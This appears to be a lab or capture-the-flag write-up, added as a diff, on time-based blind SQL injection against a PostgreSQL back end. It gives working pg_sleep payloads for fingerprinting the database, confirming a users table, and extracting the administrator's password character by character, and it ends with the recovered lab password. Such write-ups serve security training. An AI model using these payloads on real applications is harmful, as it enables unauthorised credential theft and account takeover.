@@ -1,0 +1,42 @@
+Lab 14: Blind SQL injection with time delays and information retrieval
+
+Main Goal:
+
+Grab username and password of administrator user from users table
+login as administrator user
+
+Analysis:
+
+(1) Find out which database type we are using
+' || (SELECT SLEEP(10))--     --> not mysql
+
+' || (SELECT pg_sleep(10))--  --> yes, its PostgreSql
+
+(2) Now , we need to find out users table exist in db
+
+' || (SELECT CASE WHEN (SELECT EXISTS(SELECT 1 FROM information_schema.tables
+WHERE table_name = 'users')) THEN pg_sleep(10)
+ELSE pg_sleep(0) END)--
+
+----------- both payload works------------------
+
+' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10)
+ELSE pg_sleep(0) END from users)--
+
+
+(3) We have to find out password length
+
+' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10)
+else pg_sleep(0) end from users)--
+
+password length=0-19
+
+(4) Find password of administrator
+
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10)
+else pg_sleep(0) end from users)--
+
+1 to 20
+
+password:
+ynbvqlp0aytlz53p14u7
